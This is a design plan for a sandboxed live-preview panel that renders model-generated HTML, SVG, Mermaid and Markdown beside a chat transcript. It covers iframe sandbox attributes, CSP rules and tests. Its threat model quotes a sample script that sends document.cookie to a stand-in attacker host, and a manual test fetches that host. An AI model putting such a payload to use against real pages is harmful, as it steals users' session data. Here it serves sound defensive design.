# Plan — Live preview panel for chat (artifacts)

**Written:** 2026-11-15
**Scope:** a side panel beside the transcript that renders what the model
produced — HTML, Markdown, SVG, Mermaid, code — and updates as it streams.
**Status:** design only. No code written.

---

## 0. The honest comparison with Claude artifacts

I read Anthropic's own documentation for this rather than working from
memory. What Claude actually ships:

> "An artifact is anything Claude makes for you that you'd put in front of
> someone: a design, a deck, a document, a dashboard, or a small interactive
> tool. It opens beside your conversation, and you can edit it, come back to
> it, and share it with others."
> — support.claude.com, "What are artifacts and how do I use them?"

The full feature set is much larger than "live preview":

| Capability | Claude | In scope here |
|---|---|---|
| Opens beside the conversation | yes | **yes** |
| Live update while streaming | yes | **yes** |
| HTML / Markdown / SVG / Mermaid / code | yes | **yes** |
| Data storage inside an artifact (localStorage + a real API) | yes | **no** |
| Editable canvas, direct manipulation | yes | no |
| Templates, design systems, Slides/Sheets | yes | no |
| Publish + share with others | yes | no |
| "Try fixing with Claude" on error | yes | **yes** (cheap, high value) |
| Saved to an Artifacts tab in the sidebar | yes | **yes** (reuse `messages` rows) |

The two things worth stealing that are cheap:

1. **Error → fix loop.** An error in the preview becomes a prefilled message.
   It turns the single most common failure into one click.
2. **Persistence for free.** Because replies are already rows in `messages`,
   "your artifacts tab" is a query over them, not a new table.

The things NOT worth building now: data storage, canvas editing, publishing.
Each is a product on its own, and none is what was asked for.

---

## 1. What "live preview" means precisely

Three separate behaviours, often conflated:

```
A. STREAM PREVIEW   the panel renders the document WHILE the model is still
                    writing it, updating as tokens arrive.
B. BLOCK DETECTION  deciding WHICH parts of a reply are previewable, and
                    when a block is complete vs still being written.
C. SAFE RENDERING   executing model-authored HTML in the browser without
                    giving it access to the session, the org, or the
                    customer's API keys.
```

B is where the design lives. C is where the risk lives. A is mostly plumbing.

---

## 2. Detection — what counts as previewable

The model does not tell us "this is an artifact". We infer it from the
reply. The rule, in priority order:

```
1. A fenced code block whose language is in the previewable set:
       html, svg, mermaid, markdown/md, json, csv, code (any)
   AND whose body exceeds a minimum size (see §2.2)
2. Multiple previewable blocks in one reply → the panel becomes tabbed.
3. No previewable block → no panel. The transcript is unchanged.
```

### 2.1 The previewable set, and why each is in it

| Language | Renderer | Why |
|---|---|---|
| `html` | sandboxed `<iframe>` (`srcdoc`) | the headline case: a page, a dashboard, a widget |
| `svg` | inline, sanitised | already inert once scripts and `on*` are stripped |
| `mermaid` | existing `streamdown` mermaid support | already in the product, already themed |
| `markdown` / `md` | existing `streamdown` | already in the product |
| `json` / `csv` | a table or a tree, not an iframe | structure, not layout |
| everything else | the existing code block, enlarged | a preview of a file is its text |

**Explicitly NOT previewable:** `js`, `ts`, `py`, `sh`, `bash`. Those are
source, and the existing code block already renders them correctly. Putting
them in an iframe would imply they run — they do not, and implying it is
how somebody pastes a `rm -rf` and presses play.

### 2.2 The minimum size, and the false-positive problem

Without a floor, every reply containing a two-line `html` snippet opens a
panel, and the panel becomes noise that users close reflexively. A floor of
**~400 characters or 8 lines** is the point where a block is a *thing* rather
than an *example*. Configurable, but 400 is the default.

The same rule Claude uses is worth copying here: an artifact is something
"you'd put in front of someone". A `curl` example is not.

### 2.3 Language-less fences

A fence with no language (```` ``` ````) is common, and a model writing
`<!DOCTYPE html>` often omits it. Sniff the body:

```
starts with `<!DOCTYPE` or `<html`       → html
starts with `<svg`                        → svg
starts with `graph ` / `sequenceDiagram`  → mermaid
starts with `{` or `[` and parses as JSON → json
otherwise                                 → code (no preview)
```

This is the same discipline as `engine/src/extract.rs` `sniff`: decide from
the content, not from a claim.

---

## 3. Streaming — when a block is "ready enough" to show

The hard part. Tokens arrive mid-tag. Rendering `<div class="` produces
garbage; re-rendering an iframe on every token destroys scroll position and
restarts any CSS animation.

**Rule: render at a throttled cadence, never per token.**

```
  stream emits a delta
    → if the current previewable block changed, mark dirty
    → a 150ms timer flushes: rebuild the iframe once
```

Three properties this buys:

1. **No iframe churn.** One rebuild per 150ms, not per token.
2. **No lost position.** The iframe is keyed by block index, not content, so
   a rebuild replaces `srcdoc` rather than remounting the element.
3. **Debt is bounded.** While the model is slow, nothing happens; while it
   is fast, updates stay at ~7/sec.

**Closure detection.** A fenced block is complete when its closing fence
arrives. Until then the panel says `Building…` in its header and renders the
partial document. This is what makes it feel live rather than laggy.

**Never render an incomplete `mermaid`.** A half-written graph renders as a
syntax-error box that then disappears — worse than waiting. Mermaid waits
for the closing fence; HTML does not.

---

## 4. Sandboxing — the part that must not be got wrong

Model-authored HTML is untrusted input. The model can be prompted into
writing `<script>fetch('https://attacker/'+document.cookie)</script>`, and
the session cookie is `httpOnly`, but the *page* still runs with our origin
unless we prevent it.

### 4.1 The iframe

```html
<iframe
  sandbox="allow-scripts allow-forms allow-modals allow-popups-by-user-activation"
  srcdoc="…"
  referrerpolicy="no-referrer"
  title="Preview of …"
/>
```

**`allow-same-origin` is NEVER included.** MDN states it plainly:

> "When the embedded document has the same origin as the embedding page, it
> is strongly discouraged to use both `allow-scripts` and
> `allow-same-origin`, as that lets the embedded document remove the sandbox
> attribute — making it no more secure than not using the sandbox attribute
> at all."

Without `allow-same-origin` the frame runs in an **opaque origin**: it cannot
read cookies, cannot touch `localStorage` of our domain, and cannot reach
`window.parent`'s DOM. `allow-scripts` alone is safe *because* the origin is
opaque.

### 4.2 A second layer: a real origin

A `srcdoc` iframe inherits our origin for *CSP purposes of the embedding
page* even though the sandbox makes it opaque. To get defence in depth, serve
previews from a **separate origin** — `preview.zaino.soon.it`, a second Caddy
site with its own certificate — and use `src` instead of `srcdoc`.

**Decision: `srcdoc` for v1, separate origin for v2.** Reasons:

- `srcdoc` needs no DNS, no second certificate, no deploy change.
- The sandbox attribute is the actual control; the separate origin only
  limits blast radius if the sandbox is bypassed by a browser bug.
- One DNS record and one Caddy block is genuinely cheap, so v2 is a
  half-day, not a project — but it is not required to ship safely.

The trigger for v2: the first time someone reports a browser where the
sandbox did not hold, or the feature is used by anyone outside a beta.

### 4.3 CSP inside the frame — the belt

Even with an opaque origin, a preview can make network requests (to fetch
its own assets) and those leak the viewer's IP and referrer. The `srcdoc`
content gets a `<meta http-equiv="Content-Security-Policy">` prepended:

```
default-src 'none';
style-src 'unsafe-inline' https://fonts.googleapis.com;
script-src 'unsafe-inline';
img-src data: blob: https:;
font-src data: https://fonts.gstatic.com;
connect-src 'none';
form-action 'none';
base-uri 'none';
```

`connect-src 'none'` is the load-bearing line: a preview cannot exfiltrate
anything, even to a server it controls. `script-src 'unsafe-inline'` is
required because the model's JS is inline, and it is acceptable only because
the origin is opaque and `connect-src` is closed.

**Note against `sandbox` via CSP header:** MDN — "This directive is not
supported in the `<meta>` element." So the frame sandbox comes from the
iframe attribute, and the `<meta>` CSP is the additional constraint.

### 4.4 What the preview must never see

- **No session cookie.** `httpOnly` + `SameSite=Lax` + opaque origin already
  means the frame's fetches carry nothing useful, and `connect-src 'none'`
  stops them anyway.
- **No API key.** The gateway key never reaches the browser today
  (`lib/chat/key.ts`), and nothing in this feature changes that.
- **No `window.parent` access.** Blocked by omission of `allow-same-origin`.
- **No form submission to us.** `form-action 'none'`.
- **No top-level navigation.** `allow-top-navigation` is not granted.

---

## 5. The panel UI

### 5.1 Placement

Beside the transcript, inside `SidebarInset`, as a right-hand column:

```
┌──────────┬──────────────────────────┬──────────────┐
│ sidebar  │  transcript              │  preview     │
│ (exists) │  (exists)                │  (new)       │
└──────────┴──────────────────────────┴──────────────┘
```

`grid` on the existing flex container, `preview` hidden below `lg`. A phone
gets a full-screen sheet instead of a column — a 320px-wide preview of a
dashboard is not a preview.

### 5.2 The header

```
┌─────────────────────────────────────────────┐
│ [ ] index.html   Building…   ⤢  ⌄  ✕        │
└─────────────────────────────────────────────┘
```

- **Filename**, inferred from the reply's own context (`index.html`,
  `chart.svg`) or a neutral `Preview`.
- **State**: `Building…` while streaming, `Ready`, or `Error`.
- **Open in tab** (`⤢`) — opens the same `srcdoc` via a blob URL in a new
  tab, *also sandboxed* (a new tab is not automatically safe; see MDN:
  "Sandboxing is useless if the attacker can display content outside a
  sandboxed iframe").
- **Collapse**, **close**.

### 5.3 Empty and error states

| State | What the user sees |
|---|---|
| Nothing previewable | the panel is not rendered at all |
| Streaming, first 150ms | a skeleton, never a flash of half a tag |
| Mermaid waiting for its fence | "Building…" + the source, not a parse error |
| Runtime error inside the frame | the message, plus **Fix with Claude** |
| Block too large (> 512 KB) | "Too large to preview — open as text" |

"Fix with Claude" copies the error text into the composer prefilled. That is
the one feature from Claude's artifact panel worth having on day one, and it
is ~20 lines.

---

## 6. Data model — none

**No new table.** The previewable content is the assistant message's own
text; it is already stored, already loaded by `listMessages`, and already
survives a reload. Adding an `artifacts` table would duplicate it and create
a second source of truth for "what did the model say".

The **Artifacts list** in the sidebar (a later phase) is a query:

```sql
SELECT id, conversation_id, created_at, meta->>'title'
  FROM messages
 WHERE role = 'assistant'
   AND meta->>'previewable' = 'true'
 ORDER BY created_at DESC
```

`meta.previewable` is set by the relay when it sees a fenced block meeting
the §2 rules — one boolean, written once, no migration beyond a jsonb key.

---

## 7. Files

```
NEW  lib/chat/artifacts.ts          detection + language sniffing (PURE)
NEW  lib/chat/preview-template.ts   CSP + <base> wrapper for srcdoc (PURE)
NEW  components/chat/preview-panel.tsx      the column, header, states
NEW  components/chat/preview-frame.tsx      the sandboxed iframe
NEW  components/chat/preview-tabs.tsx       one tab per previewable block
EDIT  components/chat/chat-view.tsx         derive blocks, render the column
EDIT  components/chat/chat-view.tsx         pass streaming text to the panel
EDIT  app/(chat)/layout.tsx                 grid column at lg+
NEW  tests/artifacts.test.ts                detection, sniffing, fence handling
NEW  tests/preview-template.test.ts         CSP present, no allow-same-origin
```

Nine files, two of them pure and heavily tested. The pure split is the same
discipline as `lib/chat/history.ts` and `lib/auth/oauth/policy.ts`: the rule
that decides what executes in a browser must be testable without one.

---

## 8. Tests — the ones that matter

**Detection (pure):**
1. an `html` fence over 400 chars is previewable
2. a 3-line `html` fence is NOT (the noise floor)
3. a language-less fence starting `<!DOCTYPE html>` IS
4. `js` / `bash` are never previewable
5. two blocks → two tabs; `mermaid` waits for its closing fence
6. an unterminated fence during streaming is still rendered (partial)

**Template (pure):**
7. the generated `srcdoc` contains `default-src 'none'` and
   `connect-src 'none'`
8. the iframe attributes never include `allow-same-origin` — asserted by
   reading the component, because this is a one-word security regression
9. `referrerpolicy="no-referrer"` present

**Integration:**
10. streaming a reply adds no second iframe (keyed by block index)
11. an error inside the frame surfaces "Fix with Claude" with the text
12. a > 512 KB block offers text instead of a frame

**Manual (cannot automate):**
13. paste a `fetch('https://attacker')` into a preview and confirm the CSP
    blocks it in devtools
14. confirm the frame cannot read `document.cookie` of the parent

---

## 9. Sequencing

| Step | Work | Done when |
|---|---|---|
| 1 | `artifacts.ts` + `preview-template.ts` (pure) | tests 1–9 pass |
| 2 | `preview-frame.tsx` — the sandboxed iframe | a hardcoded HTML string renders |
| 3 | `preview-panel.tsx` — column, header, states | it appears beside the transcript |
| 4 | wire into `chat-view.tsx` | a real reply opens the panel |
| 5 | streaming at 150ms | a long reply shows `Building…` then `Ready` |
| 6 | tabs for multiple blocks | two fences → two tabs |
| 7 | "Fix with Claude" on error | error → prefilled composer |
| 8 | Artifacts list in the sidebar | a query, no migration |

Steps 1–5 are the feature. Steps 6–8 are polish.

---

## 10. Explicitly out of scope

- **Data storage inside an artifact** (`localStorage` + an API). Claude has
  it; it needs per-artifact quota, cleanup and a privacy story.
- **Editing the artifact directly** in a canvas. The edit path is "ask the
  model again", which is what the product already is.
- **Publishing / sharing artifacts.** Needs a public origin, a share token,
  and a takedown policy — the same size as `share.ts` again.
- **Design systems / templates.** A later product.
- **Server-side rendering of the preview.** The browser already has an HTML
  engine; using ours would mean a headless browser on the VPS.
- **Running non-previewable code** (`js`, `py`, `sh`). Not a preview — an
  execution sandbox, a different product with a different threat model.

---

## 11. The security rules, collected

1. **`allow-same-origin` is never granted.** Without it the frame is an
   opaque origin; with it, `allow-scripts` makes the sandbox removable by the
   content. This is the single rule that must not be relaxed.
2. **`connect-src 'none'`** — a preview cannot make a network request, so it
   cannot exfiltrate what it can read.
3. **`form-action 'none'`, `base-uri 'none'`, no `allow-top-navigation`.**
4. **`referrerpolicy="no-referrer"`** — the preview must not leak which
   conversation it was rendered from.
5. **A new tab is sandboxed too.** Opening `srcdoc` in a tab without the
   same restrictions defeats the iframe.
6. **The preview never receives a credential.** It is model output, rendered;
   no key, no token, no session-derived value is ever interpolated into it.
7. **`aria-hidden` is NOT used** on the frame: it is real content the user
   asked for, so it needs a `title`.
8. **A block over 512 KB is refused**, so a preview cannot be used as a
   denial-of-service against the tab.
